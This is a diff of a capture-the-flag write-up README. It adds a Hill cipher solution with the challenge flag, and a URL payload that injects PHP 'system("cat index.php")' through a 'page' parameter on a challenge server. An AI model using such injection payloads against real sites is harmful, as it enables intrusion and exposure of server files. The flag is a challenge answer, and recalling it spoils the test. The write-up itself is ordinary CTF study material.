@@ -47,7 +47,7 @@
 ## Web <a name="web"></a>
 
 ## Cryptography <a name="crypto"></a>
-- This is [Hill Cipher](https://www.dcode.fr/hill-cipher), see how it works or use an online decoder
+1. This is [Hill Cipher](https://www.dcode.fr/hill-cipher), see how it works or use an online decoder
 ```
 -------------------------
 |76 |101|115|116|101|114|
@@ -65,7 +65,10 @@
 
 KLZCOUKTVOUWUKDOBGZVJIIIRGVHXCRQUCNOX_IBBL 
 ```
-
+![image](https://github.com/Chittu13/CTF/blob/main/image/hill_cipher.png)
+- flag ```CTF{BTW_EXISTS_AN_INTERESTING_FILM_ABOUT_HILLS}```
+2. http://62.173.140.174:46005/index.php?page=' and die(system("cat index.php")) or '
+  - if the web is old version use this in the url
 ## Forensics <a name="forensics"></a>
 - [outer space audio](https://github.com/colaclanth/sstv.git)
   - ```sudo python3 setup.py install```
